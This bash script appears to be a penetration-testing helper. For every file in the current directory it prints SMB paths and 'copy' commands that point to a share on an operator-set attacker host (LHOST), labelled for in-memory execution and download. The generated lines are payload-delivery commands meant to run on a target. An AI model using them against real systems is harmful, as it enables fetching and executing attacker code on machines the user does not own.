#!/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
WHITE='\033[0;37m'
RESET='\033[0m'


# lhost must be set with export turtlepower_lhost=IP_ADDRESS
[[ -z "$turtlepower_lhost" ]] && { echo -e "LHOST not set do it with export turtlepower_lhost=IP_ADDRESS \n**TRY turtlepower_lhost to output it ** "; exit 1; }

echo ""
echo -e "${RED}SMB Execute In Memory:${RESET}"
echo ""
for i in $(ls); do echo "\\\\$turtlepower_lhost\\SHARE\\$i"; done;



echo ""
echo -e "${BLUE}SMB Download:${RESET}"
echo ""
for i in $(ls); do echo "copy \\\\$turtlepower_lhost\\SHARE\\$i"; done;
echo ""
echo ""
